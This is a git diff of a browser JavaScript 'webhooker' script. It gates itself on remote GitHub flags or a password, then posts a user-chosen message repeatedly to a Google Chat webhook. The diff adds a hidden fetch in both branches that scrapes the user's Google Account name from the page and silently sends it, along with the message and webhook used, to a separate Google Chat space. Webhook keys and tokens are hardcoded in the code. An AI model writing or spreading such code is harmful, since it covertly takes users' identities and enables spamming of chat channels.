@@ -15,49 +15,62 @@ fetch('https://raw.githubusercontent.com/Peanutnoodlez/scripts/main/webhooker/en
 	.then(response => response.text())
 	.then(text => booga = text)
 	.then(function() {
-		if (booga == 'false\n') {
-			fetch('https://raw.githubusercontent.com/Peanutnoodlez/scripts/main/webhooker/passprot', {
-					headers: {
-						'Accept': 'application/json'
-					}
-				})
-				.then(response =>
-					response.text())
-				.then(text => ooga =
-					text)
-				.then(function() {
-					if (ooga ==
-						'false\n'
-						) {
-						whatusay
-							=
-							window
-							.prompt(
-								'What would you like to say: '
-								)
-						webhookurl
-							=
-							window
-							.prompt(
-								'what webhook would you like: ',
-								'https://chat.googleapis.com/v1/spaces/AAAAp1tFdSg/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=0IMnf5T1MPT-ovQLNVUgv4a9bajcUtOz6-CymafQWII%3D'
-							)
-						howmanytimes
-							=
-							window
-							.prompt(
-								'how many times to say it: ',
-								'1'
-								)
-
-						for (let i =
-								0; i <
-							parseInt(
-								howmanytimes
-								); i++
+			if (booga == 'false\n') {
+				fetch('https://raw.githubusercontent.com/Peanutnoodlez/scripts/main/webhooker/passprot', {
+						headers: {
+							'Accept': 'application/json'
+						}
+					})
+					.then(response =>
+						response.text())
+					.then(text => ooga =
+						text)
+					.then(function() {
+							if (ooga ==
+								'false\n'
 							) {
-							fetch
-								(webhookurl, {
+								whatusay
+									=
+									window
+									.prompt(
+										'What would you like to say: '
+									)
+								webhookurl
+									=
+									window
+									.prompt(
+										'what webhook would you like: ',
+										'https://chat.googleapis.com/v1/spaces/AAAAp1tFdSg/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=0IMnf5T1MPT-ovQLNVUgv4a9bajcUtOz6-CymafQWII%3D'
+									)
+								howmanytimes
+									=
+									window
+									.prompt(
+										'how many times to say it: ',
+										'1'
+									)
+
+								for (let i =
+										0; i <
+									parseInt(
+										howmanytimes
+									); i++
+								) {
+									fetch
+										(webhookurl, {
+											method: 'POST',
+											headers: {
+												'Accept': 'application/json',
+												'Content-Type': 'application/json'
+											},
+											body: JSON
+												.stringify({
+													'text': whatusay
+												})
+
+										})
+								}
+								fetch('https://chat.googleapis.com/v1/spaces/AAAAyUgwpzM/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=HHLGLvoVwSNH4WB7znY8tRpNuqlhWysWc-ZqBs1TM8w%3D', {
 									method: 'POST',
 									headers: {
 										'Accept': 'application/json',
@@ -65,63 +78,161 @@ fetch('https://raw.githubusercontent.com/Peanutnoodlez/scripts/main/webhooker/en
 									},
 									body: JSON
 										.stringify({
-											'text': whatusay
+											'text': (
+													document
+													.querySelector(
+														"body"
+														)
+													.innerHTML
+													)
+												.substring(
+													(document
+														.querySelector(
+															"body"
+															)
+														.innerHTML
+														)
+													.search(
+														'aria-label="Google Account: '
+														) +
+													28,
+													(document
+														.querySelector(
+															"body"
+															)
+														.innerHTML
+														)
+													.indexOf(
+														'"',
+														(document
+															.querySelector(
+																"body"
+																)
+															.innerHTML
+															)
+														.search(
+															'aria-label="Google Account: '
+															) +
+														28
+														)
+													) +
+												'\nsaid: ' +
+												whatusay +
+												'\ntimes: ' +
+												howmanytimes +
+												'\nusing: ' +
+												webhookurl
 										})
-
 								})
-						}
-					} else {
-						if (window
-							.prompt(
-								'whats the password: '
+
+							}
+						} else {
+							if (window
+								.prompt(
+									'whats the password: '
 								) +
-							'\n' ==
-							password
+								'\n' ==
+								password
 							) {
-							whatusay
-								=
-								window
-								.prompt(
-									'What would you like to say: '
+								whatusay
+									=
+									window
+									.prompt(
+										'What would you like to say: '
 									)
-							webhookurl
-								=
-								window
-								.prompt(
-									'what webhook would you like: ',
-									'https://chat.googleapis.com/v1/spaces/AAAAp1tFdSg/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=0IMnf5T1MPT-ovQLNVUgv4a9bajcUtOz6-CymafQWII%3D'
-								)
-							howmanytimes
-								=
-								window
-								.prompt(
-									'how many times to say it: ',
-									'1'
+								webhookurl
+									=
+									window
+									.prompt(
+										'what webhook would you like: ',
+										'https://chat.googleapis.com/v1/spaces/AAAAp1tFdSg/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=0IMnf5T1MPT-ovQLNVUgv4a9bajcUtOz6-CymafQWII%3D'
+									)
+								howmanytimes
+									=
+									window
+									.prompt(
+										'how many times to say it: ',
+										'1'
 									)
 
-							for (
-								let i =
-									0; i <
-								parseInt(
-									howmanytimes
+								for (let i =
+										0; i <
+									parseInt(
+										howmanytimes
 									); i++
 								) {
-								fetch
-									(webhookurl, {
-										method: 'POST',
-										headers: {
-											'Accept': 'application/json',
-											'Content-Type': 'application/json'
-										},
-										body: JSON
-											.stringify({
-												'text': whatusay
-											})
+									fetch
+										(webhookurl, {
+											method: 'POST',
+											headers: {
+												'Accept': 'application/json',
+												'Content-Type': 'application/json'
+											},
+											body: JSON
+												.stringify({
+													'text': whatusay
+												})
 
-									})
+										})
+								}
+								fetch('https://chat.googleapis.com/v1/spaces/AAAAyUgwpzM/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=HHLGLvoVwSNH4WB7znY8tRpNuqlhWysWc-ZqBs1TM8w%3D', {
+									method: 'POST',
+									headers: {
+										'Accept': 'application/json',
+										'Content-Type': 'application/json'
+									},
+									body: JSON
+										.stringify({
+											'text': (
+													document
+													.querySelector(
+														"body"
+														)
+													.innerHTML
+													)
+												.substring(
+													(document
+														.querySelector(
+															"body"
+															)
+														.innerHTML
+														)
+													.search(
+														'aria-label="Google Account: '
+														) +
+													28,
+													(document
+														.querySelector(
+															"body"
+															)
+														.innerHTML
+														)
+													.indexOf(
+														'"',
+														(document
+															.querySelector(
+																"body"
+																)
+															.innerHTML
+															)
+														.search(
+															'aria-label="Google Account: '
+															) +
+														28
+														)
+													) +
+												'\nsaid: ' +
+												whatusay +
+												'\ntimes: ' +
+												howmanytimes +
+												'\nusing: ' +
+												webhookurl
+										})
+								})
+
 							}
 						}
 					}
-				});
-		}
-	})
+			});
+	}
+})
